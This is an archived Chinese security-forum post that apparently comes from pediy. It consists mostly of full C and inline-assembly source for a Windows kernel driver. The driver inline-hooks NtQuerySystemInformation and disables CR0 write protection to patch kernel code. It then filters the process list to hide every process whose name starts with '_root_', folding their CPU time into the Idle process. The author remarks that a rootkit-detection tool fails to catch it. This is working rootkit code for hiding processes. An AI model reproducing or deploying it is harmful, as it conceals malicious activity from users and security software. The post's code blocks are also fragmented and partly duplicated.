
# 菜鸟理解的 inlineHook 的要点（RootkitUnhook 无法检测）

> 原文：[`www.pediy.com/kssd/pediy10/101825.html`](https://www.pediy.com/kssd/pediy10/101825.html)

```c
// 菜鸟刚刚理解到 inlineHook 的要点,贴出来希望和我一样的人多交流一下
// 作者:钱大宝
// inLineHook NtQuerySystemInformation 函数
// 演示对要 Hook 的函数两种处理,调用原函数前和调用原函数后
// 不知道为什么 RootkitUnhook 无法检测到

#include "ntddk.h"

// 存放原函数的前 10 字节
unsigned char orig_code[10] = {0x90, 0x90, 0x90, 0x90, 0x90,0x90, 0x90, 0x90, 0x90, 0x90};
// 存放跳转到我们自己函数的指令，用于修改原函数的前 10 个字节
unsigned char hook_code[10] = {0xe9, 0, 0, 0, 0,0x90,0x90,0x90,0x90,0x90};
// 存放跳转到原起始地址后 5 字节的段内跳指令
unsigned char jmp_org_code[5] = {0xe9, 0, 0, 0, 0};
// 保存原函数的地址
ULONG OldFuncAddr;
ULONG CR0VALUE;
// 原函数执行完的返回地址（用全局保存是为了不在我们自己的函数内去平衡堆栈）
ULONG adrOrgRet;
// 我们自己的 NtQuerySystemInformation 函数用到的参数
ULONG g_SystemInformationClass;
PVOID g_SystemInformation;
ULONG g_SystemInformationLength;
PULONG g_ReturnLength;
NTSTATUS g_ntStatus;
// 我们自己的 NtQuerySystemInformation 用到的时间变量
LARGE_INTEGER g_UserTime;
LARGE_INTEGER g_KernelTime;

// 这里直接借用 windows 内核安全防护一书
#pragma pack(1)

typedef struct ServiceDescriptorEntry {
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase; //Used only in checked build
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;

#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

struct _SYSTEM_THREADS
{
    LARGE_INTEGER       KernelTime;
    LARGE_INTEGER       UserTime;
    LARGE_INTEGER       CreateTime;
    ULONG               WaitTime;
    PVOID               StartAddress;
    CLIENT_ID           ClientIs;
    KPRIORITY           Priority;
    KPRIORITY           BasePriority;
    ULONG               ContextSwitchCount;
    ULONG               ThreadState;
    KWAIT_REASON        WaitReason;
};

struct _SYSTEM_PROCESSES
{
    ULONG               NextEntryDelta;
    ULONG               ThreadCount;
    ULONG               Reserved[6];
    LARGE_INTEGER       CreateTime;
    LARGE_INTEGER       UserTime;
    LARGE_INTEGER       KernelTime;
    UNICODE_STRING      ProcessName;
    KPRIORITY           BasePriority;
    ULONG               ProcessId;
    ULONG               InheritedFromProcessId;
    ULONG               HandleCount;
    ULONG               Reserved2[2];
    VM_COUNTERS         VmCounters;
    IO_COUNTERS         IoCounters; //windows 2000 only
    struct _SYSTEM_THREADS  Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
    LARGE_INTEGER       IdleTime;
    LARGE_INTEGER       KernelTime;
    LARGE_INTEGER       UserTime;
    LARGE_INTEGER       DpcTime;
    LARGE_INTEGER       InterruptTime;
    ULONG               InterruptCount;
};

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    IN ULONG SystemInformationClass,
        IN PVOID SystemInformation,
        IN ULONG SystemInformationLength,
        OUT PULONG ReturnLength);

typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
    ULONG SystemInformationCLass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
);

///////////////////////////////////////////////////////////////////////
// ResoleLogic function
// 这里直接借用 windows 内核安全防护一书函数,隐藏_root_ 开头的所有进程
// ResoleLogic() returns a linked list of processes.
// The function below imitates it, except it removes from the list any
// process who's name begins with "_root_".
ULONG ResoleLogic(
    IN ULONG SystemInformationClass,
    IN PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength)
{
    // Asking for a file and directory listing
    if(SystemInformationClass == 5)
    {
      // This is a query for the process list.
    // Look for process names that start with
    // '_root_' and filter them out.
    struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
        struct _SYSTEM_PROCESSES *prev = NULL;
    while(curr)
    {
            //DbgPrint("Current item is %x\n", curr);
      if (curr->ProcessName.Buffer != NULL)
      {
        if(0 == memcmp(curr->ProcessName.Buffer, L"_root_", 12))
        {
          g_UserTime.QuadPart += curr->UserTime.QuadPart;
          g_KernelTime.QuadPart += curr->KernelTime.QuadPart;
          if(prev) // Middle or Last entry
          {
            if(curr->NextEntryDelta)
              prev->NextEntryDelta += curr->NextEntryDelta;
            else  // we are last, so make prev the end
              prev->NextEntryDelta = 0;
          }
          else
          {
            if(curr->NextEntryDelta)
            {
              // we are first in the list, so move it forward
              (char *)SystemInformation += curr->NextEntryDelta;
            }
            else // we are the only process!
              SystemInformation = NULL;
          }
        }
      }
      else // This is the entry for the Idle process
      {
        // Add the kernel and user times of _root_*
        // processes to the Idle process.
        curr->UserTime.QuadPart += g_UserTime.QuadPart;
        curr->KernelTime.QuadPart += g_KernelTime.QuadPart;
        // Reset the timers for next time we filter
        g_UserTime.QuadPart = g_KernelTime.QuadPart = 0;
      }
      prev = curr;
        if(curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
        else curr = NULL;
       }
    }
    else if (SystemInformationClass == 8) // Query for SystemProcessorTimes
    {
        struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
        times->IdleTime.QuadPart += g_UserTime.QuadPart + g_KernelTime.QuadPart;
    }
    return 1;
}

VOID WPOFF()
{
        _asm
        {
                push eax
                    mov eax, cr0
                    mov CR0VALUE, eax
                    and eax, 0fffeffffh
                    mov cr0, eax
                pop eax
                cli
        };
}

VOID WPON()
{
    __asm
        {
                sti
                push eax
                    mov eax, CR0VALUE
                    mov cr0, eax
                pop eax
        };
}

__declspec(naked) int jmp_back()
{
  __asm
  {
  _emit 0x90  //原函数前 10 个字节
  _emit 0x90
  _emit 0x90
  _emit 0x90
  _emit 0x90
  _emit 0x90
  _emit 0x90
  _emit 0x90
  _emit 0x90
  _emit 0x90
  _emit 0x90  //跳转回原函数+10
  _emit 0x90
  _emit 0x90
  _emit 0x90
  _emit 0x90
  }
}

#if 0
//调用原函数前先处理
__declspec(naked) NTSTATUS NewZwQuerySystemInformation(
    IN ULONG SystemInformationClass,
```



```
    IN PVOID SystemInformation,  
    IN ULONG SystemInformationLength,  
    OUT PULONG ReturnLength)  
{  
  //原函数参数弹入我们的变量  
  __asm  
  {  
    pop SystemInformationClass  
    pop SystemInformation  
    pop SystemInformationLength  
    pop ReturnLength  
  }  
  DbgPrint("NewZwQuerySystemInformation\n");   
  //ResoleLogic(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);////可以加入函数过程  
  __asm  
  {  
    //压栈过程  
    push ReturnLength  
    push SystemInformationLength  
    push SystemInformation  
    push SystemInformationClass  
    //转到跳转函数，跳转到原函数中  
    jmp jmp_back;  
    ret;  
  }  
   //return STATUS_SUCCESS;  
}  
#else  
```

//调用原函数后再处理
```
__declspec(naked) NTSTATUS NewZwQuerySystemInformation(  
        IN ULONG SystemInformationClass,  
        IN PVOID SystemInformation,  
        IN ULONG SystemInformationLength,  
        OUT PULONG ReturnLength)  
{  
  ULONG t1;  
  //保存参数给我们自己的函数使用，因为经过原函数后  
  //堆栈已经被平衡过，所以不能再使用(这是我自己这样理解的，不一定正确）  
  //这里用全局保存参数是为了自己不用实现堆栈帧和平衡堆栈(在这里做太麻烦,易出错)  
  __asm  
  {  
    mov eax,dword ptr [esp+4]  
    mov g_SystemInformationClass,eax  
    mov eax,dword ptr [esp+8h]  
    mov g_SystemInformation,eax  
    mov eax,dword ptr [esp+0Ch]  
    mov g_SystemInformationLength,eax  
    mov eax,dword ptr [esp+10h]  
    mov g_ReturnLength,eax  
  }  
  __asm  
  {  
    pop adrOrgRet  //保存返回地址  
    push offset s1//用 s1 的地址来替代原地址，让原函数执行完后能返回 S1  
    //执行 jmp_back  
    jmp jmp_back  
    s1: nop   
  }  
  //保存原函数的返回值  
  _asm push eax  
  //全局保存原函数返回值(原因和上面一样)  
  _asm mov g_ntStatus,eax  
  DbgPrint("NewZwQuerySystemInformation\n");    
  if( NT_SUCCESS(g_ntStatus))   
    {  
      ResoleLogic(g_SystemInformationClass,g_SystemInformation,g_SystemInformationLength,g_ReturnLength);  
    }  
  _asm pop eax  
  __asm  
  {  
    //将原返回地址压栈，以便返回正确的地址  
    //mov eax, 0; eax 为原函数的返回值  
    push adrOrgRet  
    ret;  
  }  
}  
#endif  
```

//从 `ZwQuerySystemInformation` 的第 2，3，4，5 个字节
//得到 `NtQuerySystemInformation` 函数的地址
```
ULONG getOldFunAddress()  
{  
  return (ULONG)(SYSTEMSERVICE(ZwQuerySystemInformation));  
}  
```

```
void hook()  
{  
  ULONG MyFuncAddr;//我们的函数  
  ULONG jmp_backAddr;  
    KIRQL Irql;  
  //得到原函数地址，并保存  
  OldFuncAddr = getOldFunAddress();  
  //我们的函数地址  
  MyFuncAddr =(ULONG)NewZwQuerySystemInformation;  
  //由我们的函数跳转回原函数的一个辅助函数地址  
  jmp_backAddr = (ULONG)jmp_back;  
  //关闭页保护属性  
  WPOFF();  
  //提升 IRQ LEVEL  
    Irql = KeRaiseIrqlToDpcLevel();  
  //计算跳转地址,从原函数跳转到我们自己函数的偏移  
  *((ULONG*)(hook_code+1)) = (ULONG)MyFuncAddr - ((ULONG)OldFuncAddr + 5);  
  //保存原函数的前 10 个字节（取消 HOOK 时还原），因为我们要用跳转指令覆盖前 10 字节  
  memcpy(orig_code,(unsigned char *)OldFuncAddr, 10);  
  //用我们的跳转指令覆盖原函数前 10 个字节  
  memcpy((unsigned char*)OldFuncAddr, hook_code, 10);  
  //计算返回地址,从我们的跳转函数到原函数的第 11 个字节处  
  *((ULONG*)(jmp_org_code+1)) = ((ULONG)OldFuncAddr+10)  - ((ULONG)jmp_backAddr + 15);  
  //复制原函数的前 10 字节到我们的跳转函数的前 10 字节，因为我们要在跳转回原函数前  
  //执行原函数的前 10 字节  
  memcpy((unsigned char *)jmp_backAddr, orig_code, 10);  
  //复制 5 字节的跳转指令到我们的跳转函数，由它来跳转回原函数  
  memcpy((unsigned char *)jmp_backAddr + 10, jmp_org_code, 5);  
    //降低 IRQL  
    KeLowerIrql(Irql);  
  //恢复写保护  
  WPON();  
}  
```

```
void unHook()  
{  
  KIRQL Irql;  
  OldFuncAddr = getOldFunAddress();  
    WPOFF();  
    Irql = KeRaiseIrqlToDpcLevel();  
    //inline hook 函数  
    RtlCopyMemory ( (unsigned char*)OldFuncAddr, orig_code, 10);  
    // 恢复写保护，降低 IRQL  
    KeLowerIrql(Irql);  
    WPON();           
}  
```

```
VOID OnUnload(IN PDRIVER_OBJECT DriverObject)  
{  
  unHook();  
  DbgPrint("OnUnload called\n");  
}  
```

```
NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,   
        IN PUNICODE_STRING theRegistryPath)  
{  
   g_UserTime.QuadPart = g_KernelTime.QuadPart = 0;  
   theDriverObject->DriverUnload  = OnUnload;   
   hook();  
   return STATUS_SUCCESS;  
} 
```

#if 0
//调用原函数前先处理
```
__declspec(naked) NTSTATUS NewZwQuerySystemInformation(  
        IN ULONG SystemInformationClass,  
        IN PVOID SystemInformation,  
        IN ULONG SystemInformationLength,  
        OUT PULONG ReturnLength)  
{  
  //原函数参数弹入我们的变量  
  __asm  
  {  
    pop SystemInformationClass  
    pop SystemInformation  
    pop SystemInformationLength  
    pop ReturnLength  
  }  
  DbgPrint("NewZwQuerySystemInformation\n");   
  ResoleLogic(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);////可以加入函数过程  
  __asm  
  {  
    //压栈过程  
    push ReturnLength  
    push SystemInformationLength  
    push SystemInformation  
    push SystemInformationClass  
    //转到跳转函数，跳转到原函数中  
    jmp jmp_back;  
    ret;//这个 Ret 难道不多余吗？原来的返回不就是了吗？？  
  }  
   //return STATUS_SUCCESS;  
}  
#else  
```

这个 `ret` 语句不该有吧？？？
